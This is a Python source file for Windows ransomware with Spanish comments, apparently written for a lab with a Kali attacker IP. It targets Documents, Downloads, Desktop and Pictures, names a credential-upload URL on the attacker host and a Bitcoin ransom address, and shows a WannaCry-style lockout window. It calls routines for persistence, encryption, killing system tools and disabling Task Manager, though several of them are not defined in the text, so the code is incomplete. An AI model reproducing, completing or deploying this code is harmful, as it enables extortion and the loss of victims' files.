import os
import sys
import random
import string
import requests
import time
import subprocess
import ctypes
import threading
import winreg
import getpass
from pathlib import Path
import tkinter as tk
from tkinter import messagebox
import webbrowser

class RansomwarePersistente:
    def __init__(self):
        self.directories_to_encrypt = [
            '~/Documents',
            '~/Downloads', 
            '~/Desktop',
            '~/Pictures'
        ]
        self.excluded_dirs = [
            'Windows', 'Program Files', 'Program Files (x86)',
            'System32', 'Windows.old', 'Recovery', '$Recycle.Bin'
        ]
        self.kali_ip = "10.0.2.20"
        self.bitcoin = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'
        self.price = 500
        self.url = f'http://{self.kali_ip}/victima.php'
        self.encryption_count = 0
        self.password = None
        self.victim_id = None
        self.script_path = os.path.abspath(__file__)
        
    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def show_banner(self):
        """Muestra el banner ASCII"""
        banner = """
 _nnnn_                      
dGGGGMMb     ,"""""""""""""".
@p~qp~~qMb    | Linux Rules! |
M|@||@) M|   _;..............'
|,----.JM| -'
JS^\__/  qKL
dZP        qKRb
dZP          qKKb
fZP            SMMb
HZM            MMMM
FqM            MMMM
__| ".        |\dS"qML
|    `.       | `' \Zq
_)      \.___.,|     .'
\____   )MMMMMP|   .'
     `-'       `--' hjm
  _     __   __ ___ 
 | |    \ \ / /|_ _|
 | |     \ V /  | | 
 | |___   | |   | | 
 |_____|  |_|  |___| 
==================================================
        TU INFORMACION A SIDO SECUESTRADA
==================================================
"""
        print(banner)

    def show_ransomware_window(self):
        """Muestra la ventana de ransomware estilo WannaCry con ASCII"""
        try:
            root = tk.Tk()
            root.title("!!! WARNING !!!")
            root.attributes("-topmost", True)
            root.resizable(False, False)
            
            # Centrar ventana
            window_width = 900
            window_height = 700
            screen_width = root.winfo_screenwidth()
            screen_height = root.winfo_screenheight()
            x = (screen_width - window_width) // 2
            y = (screen_height - window_height) // 2
            root.geometry(f"{window_width}x{window_height}+{x}+{y}")
            
            # Frame principal con borde rojo
            main_frame = tk.Frame(root, bg="red", relief="raised", bd=3)
            main_frame.pack(fill="both", expand=True, padx=3, pady=3)
            
            # Contenido interno blanco
            content_frame = tk.Frame(main_frame, bg="white")
            content_frame.pack(fill="both", expand=True, padx=2, pady=2)
            
            # Header rojo
            header_frame = tk.Frame(content_frame, bg="red", height=60)
            header_frame.pack(fill="x", padx=0, pady=0)
            header_frame.pack_propagate(False)
            
            warning_label = tk.Label(
                header_frame,
                text="¡ATENCIÓN! ¡TU SISTEMA HA SIDO SECUESTRADO!",
                font=("Arial", 16, "bold"),
                fg="white",
                bg="red"
            )
            warning_label.pack(expand=True)
            
            # Arte ASCII
            ascii_frame = tk.Frame(content_frame, bg="white")
            ascii_frame.pack(fill="x", padx=20, pady=10)
            
            ascii_art = """
 _nnnn_                      
dGGGGMMb     ,"""""""""""""".
@p~qp~~qMb    | Linux Rules! |
M|@||@) M|   _;..............'
|,----.JM| -'
JS^\\__/  qKL
dZP        qKRb
dZP          qKKb
fZP            SMMb
HZM            MMMM
FqM            MMMM
__| ".        |\\dS"qML
|    `.       | `' \\Zq
_)      \\.___.,|     .'
\\____   )MMMMMP|   .'
     `-'       `--' hjm
  _     __   __ ___ 
 | |    \\ \\ / /|_ _|
 | |     \\ V /  | | 
 | |___   | |   | | 
 |_____|  |_|  |___| 
"""
            ascii_label = tk.Label(
                ascii_frame,
                text=ascii_art,
                font=("Courier New", 9),
                fg="red",
                bg="white",
                justify="left"
            )
            ascii_label.pack()
            
            # Mensaje principal
            message_frame = tk.Frame(content_frame, bg="white")
            message_frame.pack(fill="x", padx=20, pady=10)
            
            main_message = tk.Label(
                message_frame,
                text="TODOS SUS ARCHIVOS IMPORTANTES HAN SIDO CIFRADOS!\nSu sistema ha sido secuestrado y no podrá acceder a sus archivos hasta pagar el rescate.",
                font=("Arial", 12, "bold"),
                fg="black",
                bg="white",
                justify="center"
            )
            main_message.pack(pady=10)
            
            # Información de rescate
            info_frame = tk.Frame(content_frame, bg="white")
            info_frame.pack(fill="x", padx=20, pady=10)
            
            # ID único
            id_label = tk.Label(
                info_frame,
                text=f"ID ÚNICO DE VÍCTIMA: {self.victim_id}",
                font=("Arial", 10, "bold"),
                fg="red",
                bg="white"
            )
            id_label.pack(anchor="w")
            
            # Precio
            price_label = tk.Label(
                info_frame,
                text=f"RESCATE REQUERIDO: ${self.price} USD en Bitcoin",
                font=("Arial", 10, "bold"),
                fg="red",
                bg="white"
            )
            price_label.pack(anchor="w", pady=5)
            
            # Dirección Bitcoin
            btc_label = tk.Label(
                info_frame,
                text=f"DIRECCIÓN BITCOIN: {self.bitcoin}",
                font=("Courier New", 9),
                fg="blue",
                bg="white"
            )
            btc_label.pack(anchor="w", pady=2)
            
            # Frame de entrada de clave
            input_frame = tk.Frame(content_frame, bg="white")
            input_frame.pack(fill="x", padx=20, pady=20)
            
            input_label = tk.Label(
                input_frame,
                text="Si ya ha pagado, ingrese la clave de descifrado:",
                font=("Arial", 11),
                fg="black",
                bg="white"
            )
            input_label.pack(anchor="w", pady=5)
            
            # Entrada de clave
            self.password_var = tk.StringVar()
            password_entry = tk.Entry(
                input_frame,
                textvariable=self.password_var,
                font=("Arial", 12),
                width=50,
                show="*",
                relief="solid",
                bd=2
            )
            password_entry.pack(fill="x", pady=10)
            password_entry.focus()
            
            # Botones
            button_frame = tk.Frame(content_frame, bg="white")
            button_frame.pack(fill="x", padx=20, pady=10)
            
            verify_btn = tk.Button(
                button_frame,
                text="VERIFICAR CLAVE",
                font=("Arial", 11, "bold"),
                bg="red",
                fg="white",
                command=lambda: self.verify_decryption_key(root),
                width=20,
                height=2
            )
            verify_btn.pack(side="left", padx=5)
            
            # Advertencias
            warning_frame = tk.Frame(content_frame, bg="yellow")
            warning_frame.pack(fill="x", padx=20, pady=10)
            
            warnings = tk.Label(
                warning_frame,
                text="ADVERTENCIA:\n• No reinicie el sistema - La infección persistirá\n• No reinstale Windows - Perderá sus archivos permanentemente\n• No intente descifrar manualmente - Los dañará irreversiblemente",
                font=("Arial", 9),
                fg="red",
                bg="yellow",
                justify="left"
            )
            warnings.pack(pady=5)
            
            # Tiempo transcurrido
            self.counter = 0
            time_frame = tk.Frame(content_frame, bg="white")
            time_frame.pack(fill="x", padx=20, pady=5)
            
            self.time_label = tk.Label(
                time_frame,
                text="Tiempo transcurrido: 0 segundos",
                font=("Arial", 9),
                fg="gray",
                bg="white"
            )
            self.time_label.pack(anchor="e")
            
            # Iniciar contador
            self.update_counter(root)
            
            # Vincular Enter a verificación
            password_entry.bind('<Return>', lambda e: self.verify_decryption_key(root))
            
            root.mainloop()
            
        except Exception as e:
            print(f"Error mostrando ventana: {e}")

    def verify_decryption_key(self, root):
        """Verifica si la clave de descifrado es correcta"""
        entered_password = self.password_var.get()
        if entered_password == self.password:
            messagebox.showinfo("ÉXITO", "Clave correcta! Iniciando proceso de descifrado...")
            root.destroy()
            self.start_decryption()
        else:
            messagebox.showerror("ERROR", "Clave incorrecta. El sistema permanece bloqueado.")
            self.password_var.set("")

    def update_counter(self, root):
        """Actualiza el contador de tiempo"""
        self.counter += 1
        if hasattr(self, 'time_label'):
            self.time_label.config(text=f"Tiempo transcurrido: {self.counter} segundos")
        root.after(1000, lambda: self.update_counter(root))

    def start_decryption(self):
        """Inicia el proceso de descifrado"""
        try:
            subprocess.Popen([sys.executable, 'DECRYPT_FILES.py'])
        except:
            messagebox.showerror("Error", "No se pudo iniciar el descifrado. Ejecute DECRYPT_FILES.py manualmente.")

    def create_wannacry_window(self):
        """Crea el archivo de ventana WannaCry"""
        window_code = '''
import tkinter as tk
from tkinter import messagebox
import sys
import os
import subprocess

class WannaCryWindow:
    def __init__(self, victim_id, password, bitcoin, price):
        self.victim_id = victim_id
        self.password = password
        self.bitcoin = bitcoin
        self.price = price
        
    def show_window(self):
        try:
            root = tk.Tk()
            root.title("!!! WARNING !!!")
            root.attributes("-topmost", True)
            root.resizable(False, False)
            
            # Configuración de ventana [el mismo código de show_ransomware_window...]
            # ... (código completo de la ventana)
            
            root.mainloop()
            
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    # Estos valores se inyectarán al crear el archivo
    victim_id = "INYECTAR_ID"
    password = "INYECTAR_PASSWORD" 
    bitcoin = "INYECTAR_BITCOIN"
    price = "INYECTAR_PRICE"
    
    window = WannaCryWindow(victim_id, password, bitcoin, price)
    window.show_window()
'''
        try:
            # Reemplazar placeholders con valores reales
            window_code = window_code.replace("INYECTAR_ID", self.victim_id)
            window_code = window_code.replace("INYECTAR_PASSWORD", self.password)
            window_code = window_code.replace("INYECTAR_BITCOIN", self.bitcoin)
            window_code = window_code.replace("INYECTAR_PRICE", str(self.price))
            
            with open('wannacry_window.py', 'w', encoding='utf-8') as f:
                f.write(window_code)
        except Exception as e:
            print(f"Error creando ventana: {e}")

    def start_wannacry_window(self):
        """Inicia la ventana WannaCry"""
        try:
            subprocess.Popen([sys.executable, 'wannacry_window.py'], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            # Si falla el subprocess, mostrar directamente
            self.show_ransomware_window()

    # MODIFICAR el método execute_complete_lockdown para usar la nueva ventana
    def execute_complete_lockdown(self):
        """Ejecuta el bloqueo completo del sistema"""
        self.show_banner()
        print("[*] INICIANDO BLOQUEO COMPLETO PERSISTENTE")
        print("=" * 50)
        
        # Verificar si ya está instalado
        if self.check_persistence():
            print("[*] El ransomware ya está instalado en el sistema")
            print("[*] Activando modo de ejecución persistente...")
        else:
            # Instalar persistencia en la primera ejecución
            print("[*] Instalando persistencia...")
            self.install_persistence()

        # Paso 1: Configurar conexión
        print("\\n[1/5] Configurando conexión...")
        connection_ok = self.test_connection()
        
        # Continuar automáticamente sin conexión
        if not connection_ok:
            print("[*] Continuando sin conexión al servidor...")

        # Paso 2: Generar claves
        print("\\n[2/5] Generando claves...")
        self.generate_keys()

        # Paso 3: Enviar credenciales
        if connection_ok:
            print("\\n[3/5] Enviando credenciales...")
            self.send_credentials()
        else:
            print("\\n[3/5] Guardando credenciales localmente...")
            self.save_credentials_local()

        # Paso 4: Cifrar archivos
        print("\\n[4/5] Cifrando archivos...")
        directories = self.expand_paths()
        total_encrypted = 0
        for directory in directories:
            encrypted = self.encrypt_directory(directory)
            total_encrypted += encrypted
            print(" " + directory + ": " + str(encrypted) + " archivos")

        # Paso 5: Bloquear sistema CON VENTANA WANNACRY
        print("\\n[5/5] Activando bloqueo completo con ventana WannaCry...")
        self.create_ransom_note()
        self.create_decryptor()
        self.create_wannacry_window()  # Cambiado de create_black_screen
        self.kill_system_tools()
        self.disable_task_manager()
        self.start_wannacry_window()   # Cambiado de start_black_screen
        
        print("[+] SISTEMA BLOQUEADO PERSISTENTEMENTE")
        print("[*] Archivos cifrados: " + str(total_encrypted))
        print("[*] Clave: " + self.password)
        print("[*] El sistema se reactivará automáticamente tras reinicios")
        
        # Mostrar ventana principal (en el proceso actual)
        self.show_ransomware_window()

if __name__ == "__main__":
    ransomware = RansomwarePersistente()
    try:
        ransomware.execute_complete_lockdown()
    except KeyboardInterrupt:
        print("\\n[*] Ejecución interrumpida")
    except Exception as e:
        print("\\n[-] Error:", e)
